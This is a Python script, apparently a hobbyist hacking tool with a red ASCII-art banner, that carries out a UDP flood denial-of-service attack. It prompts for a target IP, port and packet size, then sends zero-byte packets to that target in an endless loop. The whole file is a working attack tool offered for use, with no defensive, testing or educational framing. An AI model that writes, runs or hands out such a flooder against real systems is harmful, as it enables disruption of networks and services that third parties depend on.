import socket
import time
from colorama import Fore, Back, Style

def banner():
    print(Fore.RED + "   ██╗██╗   ██╗███████╗██████╗ ██╗   ██╗███████╗██████╗  ")
    print(Fore.RED + "   ██║██║   ██║██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗ ")
    print(Fore.RED + "   ██║██║   ██║█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝ ")
    print(Fore.RED + " ██ ╚██╗ ██╔╝██╔══╝  ██╔═══╝ ╚██╗ ██╔╝██╔══╝  ██╔══██╗")
    print(Fore.RED + " ╚██ █████╔╝ ███████╗██║     ╚████╔╝ ███████╗██║  ██║")
    print(Fore.RED + "  ╚══╝╚════╝  ╚══════╝╚═╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝")
    print(Style.RESET_ALL)
    print(Fore.GREEN + "zStxbaTheBest")
    print(Style.RESET_ALL)

def send_packet(ip, port, packet_size):

    target = (ip, port)

  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    
    sock.settimeout(1) 
  
    sock.sendto(b'\x00' * packet_size, target)

    
    print(Fore.BLUE + "Sent " + str(packet_size) + " bytes to " + Fore.YELLOW + ip + Fore.BLUE + ":" + Fore.YELLOW + str(port))
    print(Style.RESET_ALL)

def udp_flood(ip, port, packet_size):
  
    banner()

    
    while True:
        
        send_packet(ip, port, packet_size)

        
        time.sleep(0.01)

if __name__ == '__main__':
    
    
    ip = input("Enter the target IP: ")
    port = int(input("Enter the target port: "))

   
    packet_size = int(input("Enter the packet size (in bytes): "))

    
    udp_flood(ip, port, packet_size)